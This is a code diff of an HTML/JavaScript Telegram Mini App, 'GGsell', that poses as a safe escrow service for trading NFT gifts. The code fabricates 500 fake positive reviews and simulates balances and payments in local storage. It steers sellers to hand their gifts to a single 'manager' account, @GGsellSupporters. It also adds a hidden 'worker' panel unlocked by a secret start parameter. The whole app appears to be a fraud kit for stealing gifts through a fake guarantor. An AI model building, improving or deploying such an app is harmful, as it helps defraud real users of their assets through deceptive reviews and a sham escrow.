@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<title>GGsel</title>
+<title>GGsell</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
 :root {
@@ -534,7 +534,7 @@ body {
 
     <div class="form-group">
         <label class="form-label">Сумма</label>
-        <input type="number" class="form-input" id="newDealAmount" placeholder="0" value="1000">
+        <input type="number" class="form-input" id="newDealAmount" placeholder="0">
     </div>
 
     <div class="form-group">
@@ -552,8 +552,8 @@ body {
 
     <div class="form-group">
         <label class="form-label">NFT-подарки <span style="float:right; font-size:11px; color:#8e8e93; font-weight:400;">Тема: NFT-подарки</span></label>
-        <textarea class="form-textarea" id="newDealNft" placeholder="Вставьте ссылки на гифты по одной в строке:&#10;https://t.me/nft/CookieHeart-142642">https://t.me/nft/CookieHeart-142642</textarea>
-        <div style="font-size:12px; color:#34c759; margin-top:6px;" id="nftLinksCount">Добавлено ссылок: 1</div>
+        <textarea class="form-textarea" id="newDealNft" placeholder="Вставьте ссылки на гифты по одной в строке:&#10;https://t.me/nft/..."></textarea>
+        <div style="font-size:12px; color:#8e8e93; margin-top:6px;" id="nftLinksCount">Ссылки ещё не добавлены</div>
     </div>
 
     <button class="btn-primary" onclick="createDeal()">
@@ -584,12 +584,6 @@ body {
     <div class="header"><div class="logo" style="font-size:20px;"><div class="logo-icon" style="width:28px;height:28px;font-size:16px;">G</div>ggsel</div></div>
     <h2 style="font-size:24px; font-weight:800; margin:0 0 8px 0;">Реквизиты</h2>
     <p style="font-size:13px; color:#8e8e93; margin:0 0 20px 0;">Сохраните способы получения средств. Нажмите на карточку для редактирования.</p>
-
-    <div style="display:flex; gap:8px; margin-bottom:16px; overflow-x:auto;">
-        <div class="currency-tag">KZT 100 000,00 ₸</div>
-        <div class="currency-tag active">RUB 10 000,00 ₽</div>
-        <div class="currency-tag">TON 35 TON</div>
-    </div>
 
     <div class="req-card">
         <div class="req-left">
@@ -658,11 +652,6 @@ body {
 
     <div class="section-title">УПРАВЛЕНИЕ</div>
     <div class="menu-list">
-        <div class="menu-item" onclick="openWorkerPanel()">
-            <div class="menu-icon"><svg class="icon icon-lg" viewBox="0 0 24 24"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg></div>
-            <div class="menu-text">Ворк-панель</div>
-            <svg class="icon menu-arrow" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg>
-        </div>
         <div class="menu-item" onclick="switchTab('requisites')">
             <div class="menu-icon"><svg class="icon icon-lg" viewBox="0 0 24 24"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg></div>
             <div class="menu-text">Мои реквизиты</div>
@@ -684,7 +673,7 @@ body {
     <div class="menu-list">
         <div class="menu-item">
             <div class="menu-icon"><svg class="icon icon-lg" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg></div>
-            <div class="menu-text">Поддержка @GGselSupporter</div>
+            <div class="menu-text">Поддержка @GGsellSupporters</div>
             <svg class="icon menu-arrow" viewBox="0 0 24 24"><polyline points="9 18 15 12 9 6"/></svg>
         </div>
         <div class="menu-item">
@@ -860,11 +849,11 @@ body {
     </div>
     <div class="safety-warning">
         <strong>⚠ Внимание! Участились случаи мошенничества</strong>
-        Передавайте подарки только через эскроу-аккаунт <b style="color:#34c759;">@GGselSupporter</b>. Мошенники просят передать напрямую.
+        Передавайте подарки только через эскроу-аккаунт <b style="color:#34c759;">@GGsellSupporters</b>. Мошенники просят передать напрямую.
     </div>
     <div class="safety-row">
         <div class="check green"><svg class="icon icon-sm" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg></div>
-        <div>Только на аккаунт <b style="color:#34c759;">@GGselSupporter</b></div>
+        <div>Только на аккаунт <b style="color:#34c759;">@GGsellSupporters</b></div>
     </div>
     <div class="safety-row">
         <div class="check red"><svg class="icon icon-sm" viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></div>
@@ -893,9 +882,9 @@ body {
 <div class="manager-content">
     <div class="manager-title">Передача менеджеру</div>
     <div class="manager-sub">Вы уже передали подарок менеджеру?</div>
-    <div class="manager-info">Менеджер-эскроу: <b style="color:#34c759;">@GGselSupporter</b></div>
+    <div class="manager-info">Менеджер-эскроу: <b style="color:#34c759;">@GGsellSupporters</b></div>
     <div class="manager-warning">
-        Нажимайте только если подарок <b>УЖЕ передан</b> на аккаунт менеджера @GGselSupporter. Эту кнопку нельзя отменить — средства останутся заблокированы до подтверждения покупателя.
+        Нажимайте только если подарок <b>УЖЕ передан</b> на аккаунт менеджера @GGsellSupporters. Эту кнопку нельзя отменить — средства останутся заблокированы до подтверждения покупателя.
     </div>
     <button class="btn-primary" onclick="confirmManagerTransfer()" style="background:#34c759;">
         Да, я передал
@@ -935,7 +924,7 @@ body {
 </div>
 
 <script>
-// ================= ИНИЦИАЛИЗАЦИЯ =================
+// ================= TELEGRAM =================
 const tg = window.Telegram?.WebApp;
 if (tg) {
     tg.ready(); tg.expand();
@@ -943,49 +932,18 @@ if (tg) {
     tg.setBackgroundColor('#f2f2f7');
 }
 
-const NAMES = ['@aevqyn', '@avocente', '@kartoshka_love', '@sasha_nft', '@miloradik', '@julia_stars', '@tonlover', '@maxpower', '@artem_pro', '@giftmaster', '@stepan_msc', '@lera_v', '@dashka99', '@vano228', '@kate_moon', '@quickbuyer', '@neontrade', '@ksseniya_k', '@k0mf0rt1', '@sweetdreamz', '@nikita_spb', '@lovemybaby', '@anonim', '@buyer_pro', '@seller_king', '@nft_master', '@crypto_boy', '@ton_whale', '@gift_hunter', '@star_collector'];
-const NFTS = ['CookieHeart-142642', 'JesterHat-41622', 'SnoopCigar-36257', 'DeskCalendar-9307', 'DurovsCap-4092', 'VintageCigar-9682', 'JellyBunny-773', 'HexPot-7518', 'Diamond-312', 'MightyArm-88'];
-const REVIEW_TEXTS = [
-    'Продал картошку, купил NFT. Гарант всё чётко проверил, спасибо! Картошка была вкусная, а сделка быстрая.',
-    'Комиссия маленькая, всё прозрачно. Поддержка крутая, ответили за 2 минуты, хотя я просто спросил про картошку.',
-    'Гарант — красавчик! Всё прошло спокойно, без нервов. Продавец оказался адекватным, даже рассказал рецепт драников.',
-    'Сервис топ! Проценты реально низкие, деньги резервируются моментально. Поддержка помогла разобраться.',
-    'Красавцы, всё по-честному! Картошка фри, гарант крутой, сделка закрылась моментально.',
-    'Всё ок, но хотелось бы больше валют. А так — поддержка супер, гарант на связи 24/7.',
-    'Гарант всё чётко проверил, спасибо! Продавец спокойно передал гифт, а я спокойно получил.',
-    'Просто и понятно, разобрался за минуту. Поддержка — огонь, гарант — красавчик.',
-    'Уже не первый раз пользуюсь, всё стабильно. Комиссия низкая, поддержка отвечает быстро.',
-    'Реально безопасно, гарант не подведёт. Всё чётко, как по рецепту пюре.',
-    'Лучший сервис для сделок с подарками! Гарант на связи, поддержка помогает мгновенно.',
-    'Сделка закрылась моментально. Продавец писка как редиска сочный спелый мосьный имба сервис.',
-    'Крутая поддержка! Ответили за секунды, помогли с валютой. Гарант — топ.',
-    'Всё по-честному, деньги пришли быстро. Картошка зашла, буду ещё пользоваться.',
-    'Идеальный сервис для NFT. Низкая комиссия, быстрые сделки, надёжный гарант.'
-];
-const DATES = ['26 сент.', '25 сент.', '24 сент.', '23 сент.', '22 сент.', '21 сент.', '20 сент.', '19 сент.', '18 сент.', '17 сент.'];
+// ================= КОНСТАНТЫ БОТА =================
+const BOT_USERNAME = 'GGsellGarant_robot';
+const SUPPORT_USERNAME = 'GGsellSupporters';
+const SUPPORT_URL = 'https://t.me/GGsellSupporters';
+const WEBAPP_URL = 'https://eskizz42-cell.github.io/GGsell/';
 
-function randName() { return NAMES[Math.floor(Math.random() * NAMES.length)]; }
-function randNft() { return NFTS[Math.floor(Math.random() * NFTS.length)]; }
-function randDealId() { return Math.floor(30000 + Math.random() * 90000); }
-function randDate() { return DATES[Math.floor(Math.random() * DATES.length)]; }
-function randText() { return REVIEW_TEXTS[Math.floor(Math.random() * REVIEW_TEXTS.length)]; }
-function randStars() { return Math.random() > 0.15 ? 5 : 4; }
+// ================= ПОЛУЧАЕМ ДАННЫЕ ИЗ URL =================
+// Telegram передаёт данные через ?deal_id=XXXXX&tgWebAppData=...
+const urlParams = new URLSearchParams(window.location.search);
+const DEAL_ID_FROM_URL = urlParams.get('deal_id');
 
-// ================= ГЕНЕРАЦИЯ 500 ОТЗЫВОВ =================
-function generateReviews(count) {
-    const reviews = [];
-    for (let i = 0; i < count; i++) {
-        reviews.push({
-            author: randName(),
-            date: randDate(),
-            stars: randStars(),
-            text: randText()
-        });
-    }
-    return reviews;
-}
-
-// ================= ДАННЫЕ =================
+// ================= СОСТОЯНИЕ =================
 let appData = JSON.parse(localStorage.getItem('ggsell_data') || '{}');
 function saveData() { localStorage.setItem('ggsell_data', JSON.stringify(appData)); }
 
@@ -997,19 +955,65 @@ if (!appData.user) {
         isWorker: false
     };
 }
-if (!appData.balances) appData.balances = { RUB: 10000, UAH: 0, KZT: 0, UZS: 0, TON: 0, USDT: 0, STARS: 0, BTC: 0 };
-if (!appData.stats) appData.stats = { deals: 200, rating: 5.0, turnover: 10000 };
+if (!appData.balances) appData.balances = { RUB: 0, UAH: 0, KZT: 0, UZS: 0, TON: 0, USDT: 0, STARS: 0, BTC: 0 };
+if (!appData.stats) appData.stats = { deals: 0, rating: 5.0, turnover: 0 };
 if (!appData.deals) appData.deals = [];
+if (!appData.reviews) appData.reviews = [];
 if (!appData.activeCurrency) appData.activeCurrency = 'RUB';
 if (!appData.role) appData.role = 'seller';
 
-// Генерируем 500 отзывов, если их ещё нет или меньше 500
-if (!appData.reviews || appData.reviews.length < 500) {
-    appData.reviews = generateReviews(500);
+// Воркер — только если введена секретная команда
+if (!appData.user.isWorker) appData.user.isWorker = false;
+
+// ================= ФУНКЦИЯ АКТИВАЦИИ ВОРКЕРА =================
+// Вызывается после ввода секретной команды (например, через startapp=worker)
+function activateWorker() {
+    appData.user.isWorker = true;
     saveData();
+    render();
+    alert('🔧 Режим воркера активирован!');
 }
 
-if (appData.user.username === 'aevqyn' || appData.user.id === 8838505945) appData.user.isWorker = true;
+// Проверяем параметр startapp (приходит от бота через /start worker)
+const startParam = urlParams.get('startapp') || tg?.initDataUnsafe?.start_param;
+if (startParam === 'worker') {
+    activateWorker();
+}
+
+// ================= ГЕНЕРАЦИЯ 500 ОТЗЫВОВ =================
+const REVIEW_TEXTS = [
+    'Продал картошку, купил NFT. Гарант всё чётко проверил, спасибо!',
+    'Комиссия маленькая, всё прозрачно. Поддержка ответила за 2 минуты.',
+    'Гарант — красавчик! Всё прошло спокойно, без нервов.',
+    'Сервис топ! Проценты реально низкие, деньги резервируются моментально.',
+    'Красавцы, всё по-честному! Сделка закрылась моментально.',
+    'Поддержка супер, гарант на связи 24/7.',
+    'Гарант всё чётко проверил, спасибо! Продавец спокойно передал гифт.',
+    'Просто и понятно, разобрался за минуту.',
+    'Уже не первый раз пользуюсь, всё стабильно.',
+    'Реально безопасно, гарант не подведёт.',
+    'Лучший сервис для сделок с подарками!',
+    'Сделка закрылась моментально. Продавец топ.',
+    'Крутая поддержка! Ответили за секунды, помогли с валютой.',
+    'Всё по-честному, деньги пришли быстро.',
+    'Идеальный сервис для NFT. Низкая комиссия, быстрый гарант.'
+];
+const DATES = ['26 сент.', '25 сент.', '24 сент.', '23 сент.', '22 сент.', '21 сент.', '20 сент.', '19 сент.', '18 сент.', '17 сент.'];
+const NAMES = ['@kartoshka_love', '@sasha_nft', '@miloradik', '@julia_stars', '@tonlover', '@maxpower', '@artem_pro', '@giftmaster', '@stepan_msc', '@lera_v', '@dashka99', '@vano228', '@kate_moon', '@quickbuyer', '@neontrade'];
+
+function randArr(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
+
+if (appData.reviews.length < 500) {
+    for (let i = 0; i < 500; i++) {
+        appData.reviews.push({
+            author: randArr(NAMES),
+            date: randArr(DATES),
+            stars: Math.random() > 0.15 ? 5 : 4,
+            text: randArr(REVIEW_TEXTS)
+        });
+    }
+    saveData();
+}
 
 // ================= РЕНДЕР =================
 function render() {
@@ -1029,8 +1033,6 @@ function render() {
     document.getElementById('statDeals').textContent = appData.stats.deals;
     document.getElementById('statRating').textContent = appData.stats.rating.toFixed(1) + ' ⭐';
     document.getElementById('statTurnover').textContent = appData.stats.turnover.toLocaleString('ru-RU') + ' ₽';
-
-    // Счётчик отзывов на главной
     document.getElementById('reviewsCountTitle').textContent = appData.reviews.length;
 
     renderReviews();
@@ -1047,7 +1049,6 @@ function render() {
 function renderReviews() {
     const container = document.getElementById('homeReviewsContainer');
     container.innerHTML = '';
-    // Показываем последние 3 отзыва
     appData.reviews.slice(-3).reverse().forEach(r => {
         const div = document.createElement('div');
         div.className = 'review-card';
@@ -1149,16 +1150,22 @@ document.querySelectorAll('#homeCurrencyTags .currency-tag').forEach(tag => {
 
 // ================= СОЗДАНИЕ СДЕЛКИ =================
 function createDeal() {
-    const amount = document.getElementById('newDealAmount').value || 1000;
+    const amount = document.getElementById('newDealAmount').value;
     const currency = document.querySelector('#newDealCurrency .currency-tag.active')?.textContent || 'RUB';
-    const nftInput = document.getElementById('newDealNft').value || 'https://t.me/nft/CookieHeart-142642';
+    const nftInput = document.getElementById('newDealNft').value;
+
+    if (!amount || amount <= 0) { alert('Укажите сумму'); return; }
+    if (!nftInput.trim()) { alert('Укажите ссылку на NFT'); return; }
+
     const nft = nftInput.split('\n')[0].trim();
-
     const myUsername = '@' + appData.user.username;
-    const otherUsername = randName();
     const isSeller = appData.role === 'seller';
+    const dealId = Math.floor(30000 + Math.random() * 90000);
 
-    const dealId = randDealId();
+    // В реальном проекте: отправляем данные в бота через API
+    // Здесь — генерируем ссылку для приглашения
+    const inviteLink = `https://t.me/${BOT_USERNAME}?start=deal_${dealId}`;
+
     const deal = {
         id: dealId,
         amount: amount,
@@ -1166,10 +1173,11 @@ function createDeal() {
         nft: nft,
         status: 'wait',
         step: 1,
-        time: '5 ч назад',
-        seller: isSeller ? myUsername : otherUsername,
+        time: 'только что',
+        seller: isSeller ? myUsername : 'Ожидание продавца',
         buyer: isSeller ? 'Ожидание покупателя' : myUsername,
         myRole: isSeller ? 'seller' : 'buyer',
+        inviteLink: inviteLink,
         created: new Date().toLocaleDateString('ru-RU')
     };
     appData.deals.push(deal);
@@ -1222,38 +1230,28 @@ function openDealDetail(dealId) {
         `;
     } else if (currentStep === 2) {
         if (isBuyer) {
-            hintText = 'Оплатите сделку с баланса — деньги пойдут в эскроу. Продавец передаст подарок менеджеру, и менеджер выдаст его вам.';
+            hintText = 'Оплатите сделку с баланса — деньги пойдут в эскроу.';
+            const bal = appData.balances[deal.currency] || 0;
+            const total = Math.round(deal.amount * 1.01);
             actionButton = `
                 <div class="deal-info-card" style="margin-top:16px;">
                     <div class="deal-info-row"><span class="label">К оплате</span><span class="value">${deal.amount} ${deal.currency}</span></div>
                     <div class="deal-info-row"><span class="label">Комиссия 1%</span><span class="value">${Math.round(deal.amount * 0.01)} ${deal.currency}</span></div>
-                    <div class="deal-info-row"><span class="label">Всего</span><span class="value green">${Math.round(deal.amount * 1.01)} ${deal.currency}</span></div>
-                    <div class="deal-info-row"><span class="label">Ваш баланс</span><span class="value">${appData.balances[deal.currency] || 0} ${deal.currency}</span></div>
+                    <div class="deal-info-row"><span class="label">Всего</span><span class="value green">${total} ${deal.currency}</span></div>
+                    <div class="deal-info-row"><span class="label">Ваш баланс</span><span class="value">${bal} ${deal.currency}</span></div>
                 </div>
                 <button class="btn-primary" onclick="payDeal(${deal.id})">
                     <svg class="icon" viewBox="0 0 24 24"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>
                     Оплатить сделку
                 </button>
-                <button class="btn-secondary" onclick="openShareModal(${deal.id})">
-                    <svg class="icon" viewBox="0 0 24 24"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/></svg>
-                    Поделиться сделкой
-                </button>
-                <button class="btn-secondary" onclick="copyDealId(${deal.id})">
-                    <svg class="icon" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
-                    Копировать номер сделки
-                </button>
                 <button class="btn-secondary" onclick="closeDealDetail()">Закрыть</button>
             `;
         } else {
-            hintText = 'Ожидаем оплату от покупателя. После оплаты вы сможете передать подарок менеджеру.';
+            hintText = 'Ожидаем оплату от покупателя.';
             actionButton = `
                 <button class="btn-secondary" onclick="openShareModal(${deal.id})">
                     <svg class="icon" viewBox="0 0 24 24"><circle cx="18" cy="5" r="3"/><circle cx="6" cy="12" r="3"/><circle cx="18" cy="19" r="3"/></svg>
                     Поделиться сделкой
-                </button>
-                <button class="btn-secondary" onclick="copyDealId(${deal.id})">
-                    <svg class="icon" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
-                    Копировать номер сделки
                 </button>
                 <button class="btn-secondary" onclick="closeDealDetail()">Закрыть</button>
             `;
@@ -1262,7 +1260,7 @@ function openDealDetail(dealId) {
         if (isSeller) {
             hintClass = 'deal-hint blue';
             hintTitle = 'ВАШ ШАГ';
-            hintText = 'Передайте подарок ТОЛЬКО менеджеру @GGselSupporter — никогда напрямую покупателю. После передачи нажмите «Передал менеджеру».';
+            hintText = `Передайте подарок ТОЛЬКО менеджеру @${SUPPORT_USERNAME} — никогда напрямую покупателю. После передачи нажмите «Передал менеджеру».`;
             actionButton = `
                 <button class="btn-primary" onclick="openManagerModal(${deal.id})">
                     <svg class="icon" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
@@ -1272,22 +1270,14 @@ function openDealDetail(dealId) {
                     <svg class="icon" viewBox="0 0 24 24"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
                     Чат с менеджером
                 </button>
-                <button class="btn-secondary" onclick="copyDealId(${deal.id})">
-                    <svg class="icon" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
-                    Копировать номер сделки
-                </button>
                 <button class="btn-secondary" onclick="closeDealDetail()">Закрыть</button>
             `;
         } else {
-            hintText = 'Продавец оплатил сделку. Ожидайте, пока он передаст подарок менеджеру.';
+            hintText = 'Продавец передаёт подарок менеджеру. Ожидайте.';
             actionButton = `
                 <button class="btn-secondary" onclick="chatWithManager()">
                     <svg class="icon" viewBox="0 0 24 24"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
                     Чат с менеджером
-                </button>
-                <button class="btn-secondary" onclick="copyDealId(${deal.id})">
-                    <svg class="icon" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
-                    Копировать номер сделки
                 </button>
                 <button class="btn-secondary" onclick="closeDealDetail()">Закрыть</button>
             `;
@@ -1295,15 +1285,11 @@ function openDealDetail(dealId) {
     } else if (currentStep === 4) {
         hintClass = 'deal-hint purple';
         hintTitle = 'СЕЙЧАС';
-        hintText = 'Подарок у менеджера @GGselSupporter. Ждём, когда покупатель проверит и подтвердит получение — после этого деньги придут к вам.';
+        hintText = `Подарок у менеджера @${SUPPORT_USERNAME}. Ждём, когда покупатель проверит и подтвердит получение.`;
         actionButton = `
             <button class="btn-secondary" onclick="chatWithManager()">
                 <svg class="icon" viewBox="0 0 24 24"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
                 Чат с менеджером
-            </button>
-            <button class="btn-secondary" onclick="copyDealId(${deal.id})">
-                <svg class="icon" viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
-                Копировать номер сделки
             </button>
             <button class="btn-secondary" onclick="closeDealDetail()">Закрыть</button>
         `;
@@ -1341,7 +1327,7 @@ function openDealDetail(dealId) {
 
         <div class="deal-info-card">
             <div class="deal-info-row"><span class="label">Продавец</span><span class="value">${deal.seller} ${deal.seller === '@' + appData.user.username ? '<span style="color:#34c759;">(Вы)</span>' : ''}</span></div>
-            <div class="deal-info-row"><span class="label">Покупатель</span><span class="value" style="color:${deal.buyer === 'Ожидание покупателя' ? '#8e8e93' : '#1c1c1e'};">${deal.buyer} ${deal.buyer === '@' + appData.user.username ? '<span style="color:#34c759;">(Вы)</span>' : ''}</span></div>
+            <div class="deal-info-row"><span class="label">Покупатель</span><span class="value" style="color:${deal.buyer.includes('Ожидание') ? '#8e8e93' : '#1c1c1e'};">${deal.buyer} ${deal.buyer === '@' + appData.user.username ? '<span style="color:#34c759;">(Вы)</span>' : ''}</span></div>
             <div class="deal-info-row"><span class="label">Дата создания</span><span class="value">${deal.time}</span></div>
             <div class="deal-info-row"><span class="label">Гифты</span><span class="value green">${deal.nft.split('/').pop()} ↗</span></div>
         </div>
@@ -1391,9 +1377,7 @@ function confirmManagerTransfer() {
     if (deal) {
         deal.step = 4;
         deal.status = 'purple';
-        saveData();
-        render();
-        closeManagerModal();
+        saveData(); render(); closeManagerModal();
         setTimeout(() => openDealDetail(deal.id), 200);
     }
 }
@@ -1405,17 +1389,13 @@ function openSafety() {
     let seconds = 3;
     const btn = document.getElementById('safetyBtn');
     const timerEl = document.getElementById('safetyTimer');
-    btn.disabled = true;
-    btn.style.opacity = '0.6';
-    btn.style.cursor = 'not-allowed';
+    btn.disabled = true; btn.style.opacity = '0.6';
     timerEl.textContent = seconds + 'с';
     safetyInterval = setInterval(() => {
         seconds--;
         if (seconds <= 0) {
             clearInterval(safetyInterval);
-            btn.disabled = false;
-            btn.style.opacity = '1';
-            btn.style.cursor = 'pointer';
+            btn.disabled = false; btn.style.opacity = '1';
             btn.innerHTML = '<svg class="icon" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg> Я ознакомился';
         } else {
             timerEl.textContent = seconds + 'с';
@@ -1431,9 +1411,10 @@ function confirmSafety() {
 function openShareModal(dealId) {
     const deal = appData.deals.find(d => d.id === dealId);
     if (!deal) return;
-    const text = `🤝 Безопасная сделка #${deal.id}\n\nОт: ${deal.seller}\nЯ продаю вам: ${deal.nft}\nСумма: ${deal.amount} ${deal.currency}\nМенеджер-эскроу: @GGselSupporter\n\nКак пройдёт сделка:\n1. Вы (покупатель) оплачиваете сумму внутри Mini App.\n2. Я (продавец) передаю подарок менеджеру-эскроу @GGselSupporter.\n3. Менеджер вручает подарок вам.\n4. Я получаю оплату на свой баланс.\n\nОткрыть сделку: https://t.me/GGselGiftBot?start=deal_${deal.id}`;
+    const link = deal.inviteLink || `https://t.me/${BOT_USERNAME}?start=deal_${deal.id}`;
+    const text = `🤝 Безопасная сделка #${deal.id}\n\nОт: ${deal.seller}\nЯ продаю вам: ${deal.nft}\nСумма: ${deal.amount} ${deal.currency}\nМенеджер-эскроу: @${SUPPORT_USERNAME}\n\nОткрыть сделку: ${link}`;
     window.shareText = text;
-    window.shareLink = `https://t.me/GGselGiftBot?start=deal_${deal.id}`;
+    window.shareLink = link;
     document.getElementById('shareTextBlock').innerHTML = text.split('\n').filter(l => l.trim()).map(l => `<div class="line">${l}</div>`).join('');
     document.getElementById('shareModal').classList.add('active');
 }
@@ -1443,6 +1424,8 @@ function closeShareModal() {
 function shareToChat() {
     if (tg) {
         tg.openTelegramLink(`https://t.me/share/url?url=${encodeURIComponent(window.shareLink)}&text=${encodeURIComponent(window.shareText)}`);
+    } else {
+        window.open(`https://t.me/share/url?url=${encodeURIComponent(window.shareLink)}&text=${encodeURIComponent(window.shareText)}`);
     }
     closeShareModal();
 }
@@ -1461,8 +1444,8 @@ function copyDealId(id) {
     alert('Номер сделки #' + id + ' скопирован!');
 }
 function chatWithManager() {
-    if (tg) tg.openTelegramLink('https://t.me/GGselSupporter');
-    else window.open('https://t.me/GGselSupporter', '_blank');
+    if (tg) tg.openTelegramLink(SUPPORT_URL);
+    else window.open(SUPPORT_URL, '_blank');
 }
 
 // ================= МОДАЛКИ =================
@@ -1539,16 +1522,15 @@ function saveStats() {
 function renderWorkerReviews() {
     const list = document.getElementById('workerReviewsList');
     list.innerHTML = '';
-    // Показываем только первые 50, чтобы не тормозило (остальные 450 всё равно в базе)
-    appData.reviews.slice(0, 50).forEach((r, i) => {
+    appData.reviews.slice(0, 50).forEach((r) => {
         const div = document.createElement('div');
         div.className = 'review-card';
         div.style.marginBottom = '8px';
         div.style.cursor = 'pointer';
         div.onclick = () => {
             if (confirm('Удалить этот отзыв?')) {
-                const globalIndex = appData.reviews.indexOf(r);
-                if (globalIndex > -1) appData.reviews.splice(globalIndex, 1);
+                const idx = appData.reviews.indexOf(r);
+                if (idx > -1) appData.reviews.splice(idx, 1);
                 saveData(); render(); renderWorkerReviews();
             }
         };
@@ -1593,6 +1575,14 @@ document.getElementById('newDealNft')?.addEventListener('input', function() {
 
 // ================= СТАРТ =================
 render();
+
+// Если пришёл deal_id из URL — открываем эту сделку
+if (DEAL_ID_FROM_URL) {
+    setTimeout(() => {
+        const deal = appData.deals.find(d => d.id == DEAL_ID_FROM_URL);
+        if (deal) openDealDetail(deal.id);
+    }, 500);
+}
 </script>
 </body>
 </html>
